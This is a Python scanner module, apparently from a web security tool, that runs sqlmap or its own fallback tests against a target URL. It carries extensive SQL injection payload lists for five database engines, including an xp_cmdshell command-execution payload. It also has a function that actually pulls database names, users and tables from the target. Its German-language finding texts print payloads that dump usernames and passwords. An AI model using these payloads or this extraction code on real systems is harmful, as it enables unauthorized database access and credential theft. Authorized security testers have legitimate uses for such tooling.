#!/usr/bin/env python3
"""
SQLMap Scanner Module - Advanced SQL Injection Detection
Uses SQLMap CLI when available, with comprehensive Python fallback
Detects SQLi via error-based, boolean-based, time-based, and union-based methods
"""
import requests
import subprocess
import os
import re
import time


def _has_sqlmap():
    """Check if sqlmap is available"""
    paths = os.environ.get('PATH', '').split(':')
    paths.append(os.path.expanduser('~/.local/bin'))
    paths.append('/usr/local/bin')
    paths.append('/usr/bin')
    paths.append('/usr/share/sqlmap')
    for p in paths:
        if os.path.isfile(os.path.join(p, 'sqlmap')):
            return os.path.join(p, 'sqlmap')
    try:
        result = subprocess.run(['which', 'sqlmap'], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
            return result.stdout.strip()
    except:
        pass
    return None


# Comprehensive SQL injection payloads by database type
SQLI_PAYLOADS = {
    'mysql': {
        'error': [
            "'", '"', "'--", "' #", "'/*", "' AND 1=1", "' AND 1=2",
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "1' AND 1=1--", "1' AND 1=2--", "1 OR 1=1", "1 AND 1=2",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT (ELT(1=1,1))),0x7e)) FROM INFORMATION_SCHEMA.PLUGINS LIMIT 0,1), 8446744073709551610, 8446744073709551610)))--",
        ],
        'time': [
            "' AND SLEEP(5)--", "' AND SLEEP(5)#", "' AND SLEEP(5)/*",
            "1' AND SLEEP(5)--", "1' AND SLEEP(5)#",
            "' OR SLEEP(5)--", "' OR SLEEP(5)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A)--",
            "' AND IF(1=1, SLEEP(5), 0)--",
            "' AND BENCHMARK(5000000, MD5(1))--",
        ],
        'union': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,@@version,3--", "' UNION SELECT 1,database(),3--",
            "' UNION SELECT 1,user(),3--", "' UNION SELECT 1,version(),3--",
        ],
        'boolean': [
            "' AND 1=1--", "' AND 1=2--",
            "' OR '1'='1'--", "' OR '1'='2'--",
            "1' AND 1=1--", "1' AND 1=2--",
            "1 AND 1=1", "1 AND 1=2",
            "' AND 'a'='a", "' AND 'a'='b",
            "' AND LENGTH(DATABASE())>0--", "' AND LENGTH(DATABASE())<0--",
            "' AND SUBSTRING(DATABASE(),1,1)='a'--", "' AND SUBSTRING(DATABASE(),1,1)='z'--",
        ],
    },
    'postgresql': {
        'error': [
            "'", "'--", "' AND 1=1", "' AND 1=2",
            "' OR '1'='1", "' OR 1=1--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' AND 1=CAST((SELECT version()) AS INTEGER)--",
            "' AND 1=CAST((SELECT current_database()) AS INTEGER)--",
            "'; SELECT version()--", "'; SELECT current_database()--",
            "' AND (SELECT 1337 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        ],
        'time': [
            "' AND pg_sleep(5)--", "' AND pg_sleep(5)#",
            "1' AND pg_sleep(5)--", "1' AND pg_sleep(5)#",
            "'; SELECT pg_sleep(5)--", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "' AND (SELECT 1 FROM pg_sleep(5))=1--",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
        ],
        'union': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT version(),NULL,NULL--",
            "' UNION SELECT current_database(),NULL,NULL--",
            "' UNION SELECT current_user,NULL,NULL--",
        ],
        'boolean': [
            "' AND 1=1--", "' AND 1=2--",
            "' AND '1'='1", "' AND '1'='2",
            "' AND LENGTH(current_database())>0--", "' AND LENGTH(current_database())<0--",
            "' AND SUBSTRING(current_database(),1,1)='a'--",
        ],
    },
    'mssql': {
        'error': [
            "'", "'--", "' AND 1=1", "' AND 1=2",
            "' OR '1'='1", "' OR 1=1--",
            "'; SELECT @@VERSION--", "'; SELECT DB_NAME()--",
            "' AND 1=CONVERT(int, @@VERSION)--",
            "' AND 1=CAST((SELECT @@VERSION) AS INT)--",
            "'; EXEC xp_cmdshell 'whoami'--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT @@VERSION,NULL--",
        ],
        'time': [
            "'; WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell 'ping -n 5 127.0.0.1'--",
        ],
        'union': [
            "' UNION SELECT NULL,NULL--", "' UNION SELECT @@VERSION,NULL--",
        ],
        'boolean': [
            "' AND 1=1--", "' AND 1=2--",
            "' AND LEN(DB_NAME())>0--", "' AND LEN(DB_NAME())<0--",
            "' AND SUBSTRING(DB_NAME(),1,1)='a'--",
        ],
    },
    'oracle': {
        'error': [
            "'", "'--", "' AND 1=1", "' AND 1=2",
            "' OR '1'='1", "' UNION SELECT NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL FROM DUAL--",
            "' AND 1=(SELECT COUNT(*) FROM user_tables)--",
            "' AND 1=(SELECT COUNT(*) FROM dual WHERE 1=1)--",
            "'||(SELECT '' FROM dual WHERE 1=1)||'",
            "'||(SELECT '' FROM dual WHERE 1=2)||'",
        ],
        'time': [
            "'||DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)||'",
            "' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE 1 END FROM DUAL)--",
            "'; BEGIN DBMS_LOCK.SLEEP(5); END;--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
        ],
        'union': [
            "' UNION SELECT NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL FROM DUAL--",
            "' UNION SELECT banner,NULL FROM v$version--",
            "' UNION SELECT table_name,NULL FROM user_tables--",
            "' UNION SELECT username,password FROM dba_users--",
        ],
        'boolean': [
            "' AND '1'='1", "' AND '1'='2",
            "'||(SELECT '' FROM dual WHERE 1=1)||'",
            "'||(SELECT '' FROM dual WHERE 1=2)||'",
        ],
    },
    'sqlite': {
        'error': [
            "'", "'--", "' AND 1=1", "' AND 1=2",
            "' OR '1'='1", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT sqlite_version(),NULL--",
            "' AND 1=randomblob(1000000000)--",
        ],
        'time': [
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
            "' UNION SELECT * FROM (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000)))) ELSE 1 END)--",
            "' AND randomblob(500000000)--",
        ],
        'union': [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT sqlite_version(),NULL--",
        ],
        'boolean': [
            "' AND 1=1--", "' AND 1=2--",
            "' AND last_insert_rowid()>0--", "' AND last_insert_rowid()<0--",
        ],
    },
}


def _send_request(target, payload, param='id'):
    """Send request with payload and return response metrics"""
    try:
        url = f'{target}?{param}={requests.utils.quote(payload)}'
        start = time.time()
        resp = requests.get(url, timeout=20, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.3)'})
        elapsed = time.time() - start
        return {
            'status': resp.status_code,
            'size': len(resp.content),
            'time': elapsed,
            'text': resp.text[:3000],
            'headers': dict(resp.headers),
        }
    except requests.exceptions.Timeout:
        return {'status': -1, 'size': -1, 'time': 20, 'timeout': True}
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'error': str(e)}


def _try_extract_data(target, db_type='mysql', param='id'):
    """Versuche tatsaechlich DB-Daten zu extrahieren"""
    extracted = []
    
    extraction_payloads = {
        'mysql': [
            ("1' UNION SELECT CONCAT('DBVERSION:',version()),2,3--", r'DBVERSION:([^<\s]+)', 'DB-Version'),
            ("1' UNION SELECT CONCAT('DBNAME:',database()),2,3--", r'DBNAME:([^<\s]+)', 'DB-Name'),
            ("1' UNION SELECT CONCAT('DBUSER:',user()),2,3--", r'DBUSER:([^<\s@]+@[^<\s]+)', 'DB-User'),
            ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", r'~([^~]+)~', 'DB-Version'),
            ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", r'~([^~]+)~', 'DB-Name'),
        ],
        'postgresql': [
            ("1' UNION SELECT version(),NULL,NULL--", r'(PostgreSQL[^<\s]+)', 'DB-Version'),
            ("1' UNION SELECT current_database(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'mssql': [
            ("1' UNION SELECT @@version,NULL,NULL--", r'(Microsoft[^<]+)', 'DB-Version'),
            ("1' UNION SELECT DB_NAME(),NULL,NULL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'oracle': [
            ("1' UNION SELECT banner,NULL FROM v$version--", r'([^<]+)', 'DB-Version'),
            ("1' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM DUAL--", r'([^<\s]+)', 'DB-Name'),
        ],
        'sqlite': [
            ("1' UNION SELECT sqlite_version(),NULL--", r'([\d\.]+)', 'DB-Version'),
            ("1' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", r'([^<\s]+)', 'Tabellen'),
        ],
    }
    
    payloads = extraction_payloads.get(db_type, extraction_payloads['mysql'])
    
    for payload, pattern, label in payloads:
        try:
            url = f'{target}?{param}={requests.utils.quote(payload)}'
            resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
                               headers={'User-Agent': 'Mozilla/5.0'})
            match = re.search(pattern, resp.text)
            if match:
                val = match.group(1).strip()
                if len(val) > 1 and len(val) < 200:
                    extracted.append(f"{label}: {val}")
        except:
            continue
    
    # Try table extraction
    table_payloads = {
        'mysql': "1' UNION SELECT CONCAT('TABLES:',group_concat(table_name)),2,3 FROM information_schema.tables WHERE table_schema=database()--",
        'postgresql': "1' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--",
        'mssql': "1' UNION SELECT string_agg(name,','),NULL,NULL FROM sys.tables--",
        'oracle': "1' UNION SELECT LISTAGG(table_name,','),NULL FROM user_tables--",
        'sqlite': "1' UNION SELECT group_concat(name,','),NULL FROM sqlite_master WHERE type='table'--",
    }
    
    tpayload = table_payloads.get(db_type, table_payloads['mysql'])
    try:
        url = f'{target}?{param}={requests.utils.quote(tpayload)}'
        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0'})
        match = re.search(r'TABLES:([^<]+)', resp.text)
        if match:
            tables = match.group(1).split(',')[:8]
            if tables and tables[0]:
                extracted.append(f"Tabellen: {', '.join(tables)}")
    except:
        pass
    
    return extracted


def _detect_db_type(target):
    """Try to detect database type from error messages"""
    test_payloads = {
        'mysql': ("'", ['mysql', 'mariadb', 'sql syntax', 'near']),
        'postgresql': ("'", ['postgresql', 'pg_query', 'psql']),
        'mssql': ("'", ['mssql', 'sql server', 'odbc', 'native client']),
        'oracle': ("'", ['ora-', 'oracle', 'pl/sql', 'sql\*plus']),
        'sqlite': ("'", ['sqlite', 'sqlite3']),
    }

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        for db_type, (payload, indicators) in test_payloads.items():
            try:
                url = f'{target}?id={requests.utils.quote(payload)}'
                resp = session.get(url, timeout=15, verify=False)
                content = resp.text.lower()
                for indicator in indicators:
                    if indicator in content:
                        return db_type
            except:
                continue
    except:
        pass

    return 'mysql'  # Default fallback


def _python_sqlmap_scan(target, findings, scan_id):
    """Comprehensive Python-based SQL injection detection"""
    print(f"[SQLMAP] Using Python fallback for {target}")

    if not target.startswith('http'):
        target = f'https://{target}'

    # Detect database type
    db_type = _detect_db_type(target)
    print(f"[SQLMAP] Detected DB type: {db_type}")

    # Get baseline
    baseline = _send_request(target, '1')
    if baseline.get('error'):
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'info',
            'type': 'sqlmap_error',
            'title': 'SQLMap: Baseline request failed',
            'url': target,
            'evidence': str(baseline['error']),
            'remediation': 'Check target URL.'
        })
        return findings

    payloads = SQLI_PAYLOADS.get(db_type, SQLI_PAYLOADS['mysql'])

    # ===== ERROR-BASED TESTS =====
    print(f"[SQLMAP] Running error-based tests...")
    error_findings = []
    tested_payloads = []

    for payload in payloads['error'][:20]:
        resp = _send_request(target, payload)
        tested_payloads.append((payload, resp))

        # Look for SQL error indicators
        error_indicators = [
            r'sql syntax', r'near', r'error in your sql',
            r'ORA-\d+', r'ora-\d+',
            r'mysql_fetch', r'mysqli_', r'pg_query', r'pg_fetch',
            r'sql server', r'odbc', r'native client',
            r'Warning.*mysql', r'Warning.*pg_',
            r'unterminated.*quote', r'quoted string not properly terminated',
            r'incorrect syntax', r'syntax error.*sql',
            r'you have an error', r'invalid query',
        ]

        text_lower = resp.get('text', '').lower()
        for indicator in error_indicators:
            if re.search(indicator, text_lower, re.IGNORECASE):
                error_findings.append({
                    'payload': payload,
                    'indicator': indicator,
                    'status': resp['status'],
                    'db_type': db_type,
                })
                break

    if error_findings:
        best = error_findings[0]
        # Build extraction examples per DB type
        extraction_examples = {
            'mysql': [
                "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--  → DB-Version",
                "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--  → DB-Name",
                "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--  → ALLE Tabellen",
                "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--  → Spalten von 'users'",
                "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--  → User+Passwoerter!",
            ],
            'postgresql': [
                "' AND 1=cast((SELECT version()) as integer)--  → DB-Version",
                "' AND 1=cast((SELECT current_database()) as integer)--  → DB-Name",
                "' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') as integer)--  → Tabellen",
            ],
            'mssql': [
                "' AND 1=@@version--  → DB-Version",
                "' AND 1=DB_NAME()--  → DB-Name",
                "'; SELECT table_name FROM information_schema.tables FOR XML PATH('')--  → Tabellen",
            ],
            'oracle': [
                "' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--  → DB-Version",
                "' AND 1=(SELECT COUNT(*) FROM user_tables)--  → Tabellen-Anzahl",
                "' UNION SELECT NULL,table_name,NULL FROM user_tables--  → Tabellennamen",
            ],
            'sqlite': [
                "' AND sqlite_version()--  → DB-Version",
                "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--  → Tabellendefinitionen",
                "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--  → Tabellennamen",
            ],
        }
        examples = extraction_examples.get(db_type, extraction_examples['mysql'])
        
        # Tatsaechlich versuchen Daten zu extrahieren!
        extracted = _try_extract_data(target, db_type)
        
        evidence_text = (
            f'=== Error-Based SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
            f'Datenbank: {db_type.upper()}\n'
            f'Payload: id={best["payload"]}\n'
            f'Fehler: {best["indicator"]}\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'=== BEISPIELE zum Daten auslesen: ===\n'
            + '\n'.join(f'  {ex}' for ex in examples) +
            f'\n\n'
            f'Mit Error-Based kann man via Fehlermeldungen\n'
            f'die KOMPLETTE Datenbank auslesen - Buchstabe fuer Buchstabe!'
        )
        
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'critical',
            'type': 'sqlmap_error_based',
            'title': f'[SQLMap] Error-Based SQL Injection ({db_type.upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'SOFORT Prepared Statements! Error-Display in Production DEAKTIVIEREN!'
        })
        scan_id += 1

    # ===== TIME-BASED TESTS =====
    print(f"[SQLMAP] Running time-based tests...")
    time_findings = []

    for payload in payloads['time'][:10]:
        # Measure normal request time
        normal_start = time.time()
        try:
            requests.get(f'{target}?id=1', timeout=10, verify=False)
        except:
            pass
        normal_time = time.time() - normal_start

        # Measure payload request time
        payload_start = time.time()
        try:
            requests.get(f'{target}?id={requests.utils.quote(payload)}', timeout=15, verify=False)
        except requests.exceptions.Timeout:
            pass
        except:
            pass
        payload_time = time.time() - payload_start

        delay = payload_time - normal_time
        if delay >= 3.0:  # At least 3 seconds delay
            time_findings.append({
                'payload': payload,
                'delay': round(delay, 2),
                'normal_time': round(normal_time, 2),
                'payload_time': round(payload_time, 2),
                'db_type': db_type,
            })

    if time_findings:
        best = max(time_findings, key=lambda x: x['delay'])
        time_extract_examples = {
            'mysql': [
                "IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0) → Buchstabe fuer Buchstabe",
                "IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0) → Passwoerter",
            ],
            'postgresql': [
                "SELECT CASE WHEN (SELECT ASCII(SUBSTRING(version(),1,1)))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END",
            ],
            'mssql': [
                "IF (ASCII(SUBSTRING((SELECT @@version),1,1))>64) WAITFOR DELAY '0:0:5'",
            ],
            'oracle': [
                "SELECT CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>64 THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE NULL END FROM DUAL",
            ],
            'sqlite': [
                "AND CASE WHEN (SELECT hex(substr(sqlite_version(),1,1)))>'30' THEN randomblob(1000000000) ELSE 0 END",
            ],
        }
        time_examples = time_extract_examples.get(db_type, time_extract_examples['mysql'])
        
        # Tatsaechlich versuchen Daten zu extrahieren!
        extracted = _try_extract_data(target, db_type)
        
        evidence_text = (
            f'=== Time-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
            f'Normal: {best["normal_time"]}s | Mit Payload: {best["payload_time"]}s\n'
            f'DELAY: {best["delay"]} SEKUNDEN!\n'
            f'Payload: id={best["payload"]}\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n'
            + '\n'.join(f'  {ex}' for ex in time_examples) +
            f'\n\n'
            f'Mit Time-Based kann man via Zeitverzoegerung\n'
            f'die KOMPLETTE Datenbank bit fuer bit auslesen!\n'
            f'Langsam aber 100% zuverlaessig!'
        )
        
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'critical',
            'type': 'sqlmap_time_based',
            'title': f'[SQLMap] Time-Based Blind SQLi ({db_type.upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'SOFORT Prepared Statements! Alle User-Inputs parametrisieren!'
        })
        scan_id += 1

    # ===== BOOLEAN-BASED TESTS =====
    print(f"[SQLMAP] Running boolean-based tests...")
    boolean_findings = []

    bool_pairs = []
    bool_payloads = payloads['boolean']
    for i in range(0, len(bool_payloads) - 1, 2):
        if i + 1 < len(bool_payloads):
            bool_pairs.append((bool_payloads[i], bool_payloads[i + 1]))

    for true_payload, false_payload in bool_pairs[:8]:
        true_resp = _send_request(target, true_payload)
        false_resp = _send_request(target, false_payload)

        size_diff = abs(true_resp['size'] - false_resp['size'])
        status_diff = true_resp['status'] != false_resp['status']

        if size_diff > max(baseline['size'] * 0.05, 300) or status_diff:
            boolean_findings.append({
                'true_payload': true_payload,
                'false_payload': false_payload,
                'true_size': true_resp['size'],
                'false_size': false_resp['size'],
                'diff': size_diff,
                'db_type': db_type,
            })

    if boolean_findings:
        best = boolean_findings[0]
        bool_extract_examples = {
            'mysql': [
                "' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--  → Erster Buchstabe > 'A'?",
                "' AND LENGTH((SELECT password FROM users LIMIT 1))>5--  → Passwort laenger als 5?",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>10--  → Mehr als 10 Tabellen?",
            ],
            'postgresql': [
                "' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--  → Erster Buchstabe",
                "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--  → Passwort-Laenge",
            ],
            'mssql': [
                "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--  → Erster Buchstabe",
                "' AND (SELECT LEN(password) FROM users WHERE id=1)>5--  → Passwort-Laenge",
            ],
            'oracle': [
                "' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>64--",
                "' AND (SELECT COUNT(*) FROM user_tables)>5--  → Tabellen-Anzahl",
            ],
            'sqlite': [
                "' AND hex(substr(sqlite_version(),1,1))>'30'--  → Erster Buchstabe",
                "' AND (SELECT length(sql) FROM sqlite_master WHERE type='table' LIMIT 1)>10--",
            ],
        }
        bool_examples = bool_extract_examples.get(db_type, bool_extract_examples['mysql'])
        
        # Tatsaechlich versuchen Daten zu extrahieren!
        extracted = _try_extract_data(target, db_type)
        
        evidence_text = (
            f'=== Boolean-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
            f'TRUE:  {best["true_size"]} bytes | FALSE: {best["false_size"]} bytes\n'
            f'Unterschied: {best["diff"]} bytes\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'=== Boolean-Based Extraktion (Ja/Nein Fragen): ===\n'
            + '\n'.join(f'  {ex}' for ex in bool_examples) +
            f'\n\n'
            f'Mit Boolean-Based kann man via TRUE/FALSE Antworten\n'
            f'die KOMPLETTE Datenbank bit fuer bit auslesen!\n'
            f'Langsam aber sehr zuverlaessig!'
        )
        
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'critical',
            'type': 'sqlmap_boolean_based',
            'title': f'[SQLMap] Boolean-Based Blind SQLi ({db_type.upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'Prepared Statements + Input-Validierung SOFORT!'
        })
        scan_id += 1

    # ===== UNION-BASED TESTS =====
    print(f"[SQLMAP] Running union-based tests...")
    union_findings = []

    for payload in payloads['union'][:8]:
        resp = _send_request(target, payload)
        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline['size']) < max(baseline['size'] * 0.1, 500):
            if resp['size'] > 100:
                col_count = payload.count('NULL')
                union_findings.append({
                    'payload': payload,
                    'columns': col_count,
                    'size': resp['size'],
                })

    if union_findings:
        best = union_findings[0]
        cols = best["columns"]
        # Build UNION extraction examples based on column count
        union_extract = []
        if cols >= 1:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-1)}version()--  → DB-Version")
        if cols >= 2:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-2)}user(),database()--  → User + DB")
        if cols >= 3:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-3)}table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--  → Spalten")
        if cols >= 4:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-4)}id,username,password FROM users LIMIT 1--  → User-Daten!")
        
        # Tatsaechlich versuchen Daten via UNION zu extrahieren!
        extracted = _try_extract_data(target, db_type)
        
        evidence_text = (
            f'=== UNION SQLi BESTATIGT - DIREKTER DATENZUGRIFF! ===\n\n'
            f'UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n'
            f'Payload: id={best["payload"]}\n\n'
        )
        
        if extracted:
            evidence_text += f'=== ECHTE DATEN EXTRahiERT via UNION! ===\n'
            for item in extracted:
                evidence_text += f'  ✓ {item}\n'
            evidence_text += f'\n'
        
        evidence_text += (
            f'=== BEISPIELE zum direkten Auslesen: ===\n'
            + '\n'.join(f'  {ex}' for ex in union_extract) +
            f'\n\n'
            f'=== KOMPLETTER Daten-Dump: ===\n'
            f"  ' UNION SELECT {'NULL,' * (cols-1)}group_concat(username,':',password) FROM users--\n"
            f'  → ALLE Usernamen + Passwoerter auf einmal!\n\n'
            f'UNION ist die SCHNELLSTE SQLi-Methode!\n'
            f'Direkter Zugriff auf ALLE Datenbank-Inhalte!'
        )
        
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'critical',
            'type': 'sqlmap_union_based',
            'title': f'[SQLMap] UNION SQLi ({cols} Spalten, {db_type.upper()}){" [DATEN EXTRahiERT!]" if extracted else ""}',
            'url': f'{target}?id=',
            'evidence': evidence_text,
            'remediation': 'SOFORT Prepared Statements! NIEMALS User-Input in Queries!'
        })
        scan_id += 1

    # Summary
    if not findings:
        findings.append({
            'id': f'sqlm-{scan_id}',
            'severity': 'info',
            'type': 'sqlmap_clean',
            'title': f'SQLMap: Keine SQL Injection nachweisbar ({db_type})',
            'url': target,
            'evidence': f'Error: {len(error_findings)}, Time: {len(time_findings)}, Boolean: {len(boolean_findings)}, Union: {len(union_findings)}',
            'remediation': 'Trotzdem Prepared Statements verwenden.'
        })
    else:
        findings.insert(0, {
            'id': f'sqlm-{scan_id}',
            'severity': 'critical',
            'type': 'sqlmap_summary',
            'title': f'[SQLMap] SQL Injection BESTATIGT via {len(findings)} Methoden!',
            'url': target,
            'evidence': (
                f'SQL INJECTION NACHWEISBAR auf {db_type.upper()}!\n\n'
                f'Erfolgreiche Tests:\n'
                f'- Error-Based: {"JA" if error_findings else "NEIN"}\n'
                f'- Time-Based: {"JA" if time_findings else "NEIN"}\n'
                f'- Boolean-Based: {"JA" if boolean_findings else "NEIN"}\n'
                f'- Union-Based: {"JA" if union_findings else "NEIN"}\n\n'
                f'Getestete Payloads: {len(payloads["error"]) + len(payloads["time"]) + len(payloads["boolean"]) + len(payloads["union"])}'
            ),
            'remediation': 'SOFORT patchen! Siehe Tutorial fuer Fix-Beispiele!'
        })

    return findings


def scan(target):
    findings = []
    scan_id = 0

    if not target.startswith('http'):
        target = f'https://{target}'

    print(f"[PHASE SQLMAP] Scanning {target}")

    sqlmap_path = _has_sqlmap()

    if sqlmap_path:
        try:
            cmd = [
                'python3', sqlmap_path,
                '-u', f'{target}?id=1',
                '--batch',
                '--level=1',
                '--risk=1',
                '--timeout=10',
                '--retries=1',
                '--threads=1',
                '--tamper=space2comment',
                '--technique=BEUSTQ',
                '--flush-session',
                '--answers=Y',
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout + '\n' + result.stderr

            # Parse SQLMap output
            if 'is vulnerable' in output.lower() or 'parameter' in output.lower() and 'vulnerable' in output.lower():
                # Extract injection details
                injection_match = re.search(r'Parameter\s+(.+?)\s+is\s+vulnerable', output, re.IGNORECASE)
                param = injection_match.group(1) if injection_match else 'id'

                technique_match = re.search(r'Technique:\s*(\w+)', output)
                technique = technique_match.group(1) if technique_match else 'Unknown'

                db_match = re.search(r'back-end DBMS:\s*(.+)', output)
                dbms = db_match.group(1) if db_match else 'Unknown'

                findings.append({
                    'id': f'sqlm-{scan_id}',
                    'severity': 'critical',
                    'type': 'sqlmap_confirmed',
                    'title': f'[SQLMap] SQL Injection BESTATIGT - {technique}',
                    'url': f'{target}?id=',
                    'evidence': (
                        f'SQLMap hat SQL Injection bestaetigt!\n\n'
                        f'Parameter: {param}\n'
                        f'Technik: {technique}\n'
                        f'Datenbank: {dbms}\n\n'
                        f'SQLMap Output:\n{output[:1000]}'
                    ),
                    'remediation': 'SOFORT Prepared Statements implementieren!'
                })
                scan_id += 1
            else:
                # SQLMap found nothing - use Python fallback
                return _python_sqlmap_scan(target, findings, scan_id)

        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
            return _python_sqlmap_scan(target, findings, scan_id)
    else:
        return _python_sqlmap_scan(target, findings, scan_id)

    if not findings:
        return _python_sqlmap_scan(target, findings, scan_id)

    return findings
